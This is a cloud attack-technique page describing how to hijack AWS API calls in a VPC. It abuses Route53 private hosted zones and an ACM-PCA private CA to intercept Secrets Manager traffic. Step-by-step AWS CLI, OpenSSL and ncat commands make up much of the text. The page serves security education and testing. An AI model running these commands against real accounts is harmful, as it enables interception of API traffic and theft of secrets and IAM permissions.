---
author_name: Patryk Bogusz
title: AWS API Call Hijacking via ACM-PCA
description: By modifying the route53 entries and utilizing the acm-pca private CA one can hijack the calls to AWS API inside the AWS VPC
hide:
  - toc
---

# AWS API Call Hijacking via ACM-PCA

Original Research: [niebardzo](https://twitter.com/niebardzo2) - [Hijacking AWS API Calls](https://niebardzo.github.io/2022-03-11-aws-hijacking-route53/) 

**Required IAM Permission**: [route53:CreateHostedZone](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/route53/create-hosted-zone.html), [route53:ChangeResourceRecordSets](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/route53/change-resource-record-sets.html), [acm-pca:IssueCertificate](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/acm-pca/issue-certificate.html), [acm-pca:GetCertificate](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/acm-pca/get-certificate.html)  
**Recommended but not required**: [route53:GetHostedZone](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/route53/get-hosted-zone.html), [route53:ListHostedZones](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/route53/list-hosted-zones.html), [acm-pca:ListCertificateAuthorities](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/acm-pca/list-certificate-authorities.html), [ec2:DescribeVpcs](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/ec2/describe-vpcs.html) (may be useful for enumeration, but are not requires as the info can be enumerated in other ways)  

!!! Note
    To perform this attack the target account must already have an [AWS Certificate Manager Private Certificate Authority](https://aws.amazon.com/certificate-manager/private-certificate-authority/) (AWS-PCA) setup in the account, and EC2 instances in the VPC(s) must have already imported the certificates to trust it. With this infrastructure in place, the following attack can be performed to intercept AWS API traffic.

Assuming there is an AWS VPC with multiple cloud-native applications talking to each other and to AWS API. Since the communication between the microservices is often TLS encrypted there must be a private CA to issue the valid certificates for those services. If ACM-PCA is used for that and the adversary manages to get access to control both route53 and acm-pca private CA with the minimum set of permissions described above, it can hijack the application calls to AWS API taking over their IAM permissions.

This is possible because:  

* AWS SDKs do not have [Certificate Pinning](https://www.digicert.com/blog/certificate-pinning-what-is-certificate-pinning)
* Route53 allows creating Private Hosted Zone and DNS records for AWS APIs domain names
* Private CA in ACM-PCA cannot be restricted to signing only certificates for specific Common Names

For example, Secrets Manager in us-east-1 could be re-routed by an adversary setting the secretsmanager.us-east-1.amazonaws.com domain to an IP controlled by the adversary. The following creates the private hosted zone for secretsmanager.us-east-1.amazonaws.com:
```
aws route53 create-hosted-zone --name secretsmanager.us-east-1.amazonaws.com --caller-reference sm4 --hosted-zone-config PrivateZone=true --vpc VPCRegion=us-east-1,VPCId=<VPCId>
```

Then set the A record for secretsmanager.us-east-1.amazonaws.com in this private hosted zone. Use the following POST body payload - mitm.json:

```
{
  "Comment": "<anything>",
  "Changes": [{
    "Action": "UPSERT",
    "ResourceRecordSet": {
      "Name": "secretsmanager.us-east-1.amazonaws.com",
      "Type": "A",
      "TTL": 0,
      "ResourceRecords": [{"Value": "<ip_of_adversary_instance_in_the_VPC>"}]
    }
  }]
}
```

One set TTL to 0 to avoid DNS caching. Then, the advisory uses this payload to change-resource-record-sets:
```
aws route53 change-resource-record-sets --hosted-zone-id <id_returned_by_previous_API_call> --change-batch file://mitm.json
```

Now, the adversary must generate the CSR and send it for signing to the ACM-PCA, CSR and private key can be generated with OpenSSL:
```
openssl req -new -newkey rsa:2048 -nodes -keyout your_domain.key -out your_domain.csr
```

For CN (Common Name), one must provide secretsmanager.us-east-1.amazonaws.com. Then one sends the CSR to acm-pca to issue the certificate:
```
aws acm-pca issue-certificate --certificate-authority-arn "<arn_of_ca_used_within_vpc>" --csr file://your_domain.csr --signing-algorithm SHA256WITHRSA --validity Value=365,Type="DAYS" --idempotency-token 1234
```

It returns the signed certificate ARN in the response. The next call is to fetch the certificate.

```
aws acm-pca get-certificate --certificate-arn "<cert_arn_from_previous_response>" --certificate-authority-arn "<arn_of_ca_used_within_vpc>"
```

Once one got the signed certificate on the disk as cert.crt, the adversary starts the listener or 443/TCP and sniffs the calls to the secretsmanager.us-east-1.amazonaws.com
```
sudo ncat --listen -p 443 --ssl --ssl-cert cert.crt --ssl-key your_domain.key -v
```

The calls can be then forwarded to the Secrets Manager VPCE to for example GetSecretValue and get unauthorized access to the data. The same action can be done with any AWS API called from the VPC - S3, KMS, etc.